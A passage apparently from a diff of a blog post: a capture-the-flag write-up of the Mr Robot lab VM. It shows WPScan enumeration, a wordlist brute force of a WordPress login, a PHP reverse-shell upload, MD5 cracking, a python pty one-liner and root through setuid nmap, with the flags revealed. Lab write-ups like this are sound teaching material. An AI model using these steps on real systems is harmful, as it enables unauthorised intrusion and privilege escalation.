-</span><span class='line'>--batch                             Never ask for user input, use the default behaviour.
-</span><span class='line'>--no-color                          Do not use colors in the output.
-</span><span class='line'>--log                               Creates a log.txt file with WPScan's output.
-</span><span class='line'>--no-banner                         Prevents the WPScan banner from being displayed.
-</span><span class='line'>--disable-accept-header             Prevents WPScan sending the Accept HTTP header.
-</span><span class='line'>--disable-referer                   Prevents setting the Referer header.
-</span><span class='line'>--disable-tls-checks                Disables SSL/TLS certificate verification.
-</span><span class='line'>--wp-content-dir &lt;wp content dir&gt;   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.
-</span><span class='line'>                                    Subdirectories are allowed.
-</span><span class='line'>--wp-plugins-dir &lt;wp plugins dir&gt;   Same thing than --wp-content-dir but for the plugins directory.
-</span><span class='line'>                                    If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
-</span><span class='line'>--proxy &lt;[protocol://]host:port&gt;    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.
-</span><span class='line'>                                    If no protocol is given (format host:port), HTTP will be used.
-</span><span class='line'>--proxy-auth &lt;username:password&gt;    Supply the proxy login credentials.
-</span><span class='line'>--basic-auth &lt;username:password&gt;    Set the HTTP Basic authentication.
-</span><span class='line'>--wordlist | -w &lt;wordlist&gt;          Supply a wordlist for the password brute forcer.
-</span><span class='line'>--username | -U &lt;username&gt;          Only brute force the supplied username.
-</span><span class='line'>--usernames     &lt;path-to-file&gt;      Only brute force the usernames from the file.
-</span><span class='line'>--cache-dir       &lt;cache-directory&gt; Set the cache directory.
-</span><span class='line'>--cache-ttl       &lt;cache-ttl&gt;       Typhoeus cache TTL.
-</span><span class='line'>--request-timeout &lt;request-timeout&gt; Request Timeout.
-</span><span class='line'>--connect-timeout &lt;connect-timeout&gt; Connect Timeout.
-</span><span class='line'>--threads  | -t &lt;number of threads&gt; The number of threads to use when multi-threading requests.
-</span><span class='line'>--max-threads     &lt;max-threads&gt;     Maximum Threads.
-</span><span class='line'>--throttle        &lt;milliseconds&gt;    Milliseconds to wait before doing another web request. If used, the --threads should be set to 1.
-</span><span class='line'>--help     | -h                     This help screen.
-</span><span class='line'>--verbose  | -v                     Verbose output.
-</span><span class='line'>--version                           Output the current version and exit.
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Examples :
-</span><span class='line'>
-</span><span class='line'>-Further help ...
-</span><span class='line'>ruby ./wpscan.rb --help
-</span><span class='line'>
-</span><span class='line'>-Do 'non-intrusive' checks ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com
-</span><span class='line'>
-</span><span class='line'>-Do wordlist password brute force on enumerated users using 50 threads ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
-</span><span class='line'>
-</span><span class='line'>-Do wordlist password brute force on the 'admin' username only ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin
-</span><span class='line'>
-</span><span class='line'>-Enumerate installed plugins ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate p
-</span><span class='line'>
-</span><span class='line'>-Enumerate installed themes ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate t
-</span><span class='line'>
-</span><span class='line'>-Enumerate users ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate u
-</span><span class='line'>
-</span><span class='line'>-Enumerate installed timthumbs ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate tt
-</span><span class='line'>
-</span><span class='line'>-Use a HTTP proxy ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118
-</span><span class='line'>
-</span><span class='line'>-Use a SOCKS5 proxy ... (cURL &gt;= v7.21.7 needed)
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000
-</span><span class='line'>
-</span><span class='line'>-Use custom content directory ...
-</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content
-</span><span class='line'>
-</span><span class='line'>-Use custom plugins directory ...
-</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins
-</span><span class='line'>
-</span><span class='line'>-Update the DB ...
-</span><span class='line'>ruby ./wpscan.rb --update
-</span><span class='line'>
-</span><span class='line'>-Debug output ...
-</span><span class='line'>ruby ./wpscan.rb --url www.example.com --debug-output 2&gt;debug.log
-</span><span class='line'>
-</span><span class='line'>See README for further information.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145 --enumerate u vp vt --no-banner
-</span><span class='line'>[+] URL: http://192.168.217.145/
-</span><span class='line'>[+] Started: Sat Jul  1 07:40:05 2017
-</span><span class='line'>
-</span><span class='line'>[+] robots.txt available under: 'http://192.168.217.145/robots.txt'
-</span><span class='line'>[!] The WordPress 'http://192.168.217.145/readme.html' file exists exposing a version number
-</span><span class='line'>[+] Interesting header: SERVER: Apache
-</span><span class='line'>[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
-</span><span class='line'>[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
-</span><span class='line'>[+] XML-RPC Interface available under: http://192.168.217.145/xmlrpc.php
-</span><span class='line'>
-</span><span class='line'>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
-</span><span class='line'>[!] 1 vulnerability identified from the version number
-</span><span class='line'>
-</span><span class='line'>[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
-</span><span class='line'>    Reference: https://wpvulndb.com/vulnerabilities/8807
-</span><span class='line'>    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
-</span><span class='line'>    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
-</span><span class='line'>    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
-</span><span class='line'>
-</span><span class='line'>[+] Enumerating plugins from passive detection ...
-</span><span class='line'>[+] No plugins found
-</span><span class='line'>
-</span><span class='line'>[+] Enumerating usernames ...
-</span><span class='line'>[+] We did not enumerate any usernames
-</span><span class='line'>
-</span><span class='line'>[+] Finished: Sat Jul  1 07:40:07 2017
-</span><span class='line'>[+] Requests Done: 57
-</span><span class='line'>[+] Memory used: 17.109 MB
-</span><span class='line'>[+] Elapsed time: 00:00:02</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l fsocity.dic 
-</span><span class='line'>858160 fsocity.dic</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Not a small one, but maybe it contains duplicates:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sort fsocity.dic | uniq | wc -l
-</span><span class='line'>11451</span></code></pre></td></tr></table></div></figure>
-
-
-<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>
-
-<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/wplogin.png" title="wplogin" alt="wplogin"></p>
-
-<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145/ --wordlist ~/Downloads/fsociety.txt --username elliot
-</span><span class='line'>[...]
-</span><span class='line'>[+] Starting the password brute forcer
-</span><span class='line'>  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                  
-</span><span class='line'>
-</span><span class='line'>  Brute Forcing 'elliot' Time: 00:02:27 &lt;==================================                                    &gt; (5640 / 11452) 49.24%  ETA: 00:02:32
-</span><span class='line'>  +----+--------+------+-----------+
-</span><span class='line'>  | Id | Login  | Name | Password  |
-</span><span class='line'>  +----+--------+------+-----------+
-</span><span class='line'>  |    | elliot |      | ER28-0652 |
-</span><span class='line'>  +----+--------+------+-----------+</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/plugins.png" title="wp plugins" alt="wp plugins"></p>
-
-<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/media.png" title="media library" alt="media library"></p>
-
-<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>
-
-<h2>Flag #2</h2>
-
-<p>Finally achieved presence on the machine:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
-</span><span class='line'>daemon
-</span><span class='line'>$ ls /home
-</span><span class='line'>robot
-</span><span class='line'>$ ls -la /home/robot
-</span><span class='line'>total 16
-</span><span class='line'>drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-</span><span class='line'>drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-</span><span class='line'>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-</span><span class='line'>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/robot/password.raw-md5
-</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ su robot
-</span><span class='line'>su: must be run from a terminal</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import pty; pty.spawn("/bin/sh")'
-</span><span class='line'>$ su robot
-</span><span class='line'>su robot
-</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz
-</span><span class='line'>
-</span><span class='line'>robot@linux:/$ </span></code></pre></td></tr></table></div></figure>
-
-
-<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:~$ cat key-2-of-3.txt
-</span><span class='line'>cat key-2-of-3.txt
-</span><span class='line'>822c73956184f694993bede3eb39f959</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Flag #3</h2>
-
-<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
-</span><span class='line'>[...]
-</span><span class='line'>/usr/local/bin/nmap</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ nmap --interactive
-</span><span class='line'>nmap --interactive
-</span><span class='line'>
-</span><span class='line'>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-</span><span class='line'>Welcome to Interactive Mode -- press h &lt;enter&gt; for help
-</span><span class='line'>nmap&gt; </span></code></pre></td></tr></table></div></figure>
-
-
-<p>The Nmap version is 3.81, so I tried it out:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !whoami
-</span><span class='line'>!whoami
-</span><span class='line'>root
-</span><span class='line'>waiting to reap child : No child processes</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It did work! Game over, Mr Robot!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !sh
-</span><span class='line'>!sh
-</span><span class='line'># ls /root
-</span><span class='line'>ls /root
-</span><span class='line'>firstboot_done    key-3-of-3.txt
-</span><span class='line'># cat /root/key-3-of-3.txt
-</span><span class='line'>cat /root/key-3-of-3.txt
-</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>
-
-<p><strong>Learn more</strong></p>
-
-<ul>
-<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
-<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
-</span><span class='line'>/ You have literary talent that you \
-</span><span class='line'>\ should take pains to develop.     /
-</span><span class='line'> -----------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
 </span><span class='line'>            (__)\       )\/\
